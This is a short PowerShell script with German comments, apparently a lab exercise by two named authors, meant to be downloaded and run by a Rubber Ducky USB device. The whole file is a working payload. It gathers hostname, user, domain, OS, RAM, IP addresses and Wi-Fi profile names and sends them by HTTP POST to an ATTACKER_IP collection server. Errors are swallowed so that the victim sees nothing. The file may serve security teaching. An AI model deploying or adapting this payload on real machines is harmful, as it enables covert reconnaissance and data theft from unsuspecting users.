# ============================================================
#  W02a.2 – Info-Gathering Payload (vom Webserver geladen)
#  Autoren: Raphael Bleier, Joachim Lugger
#  Wird per IEX vom Rubber Ducky heruntergeladen und ausgeführt
#  Ersetze ATTACKER_IP mit der echten IP-Adresse!
# ============================================================

$ATTACKER = "http://ATTACKER_IP:8080/collect"

# Systeminformationen sammeln
$hostname  = $env:COMPUTERNAME
$user      = $env:USERNAME
$domain    = $env:USERDOMAIN
$os        = (Get-WmiObject Win32_OperatingSystem).Caption
$arch      = $env:PROCESSOR_ARCHITECTURE
$ram       = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Netzwerk-Informationen
$ips = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object {$_.IPAddress -notlike '127*'} |
        Select-Object -ExpandProperty IPAddress) -join ', '

# WLAN-Profile (Profilnamen, keine Passwörter)
$wifiProfiles = (netsh wlan show profiles) -join "`n"

# Alles zusammenführen
$report = @"
=== SYSTEM INFORMATION ===
Hostname   : $hostname
User       : $user
Domain     : $domain
OS         : $os
Arch       : $arch
RAM (GB)   : $ram
IP(s)      : $ips

=== WIFI PROFILES ===
$wifiProfiles
"@

# Per HTTP POST senden
try {
    Invoke-WebRequest -Uri $ATTACKER -Method POST -Body $report -UseBasicParsing | Out-Null
} catch {
    # Stilles Scheitern – keine Fehlermeldung beim Opfer
}
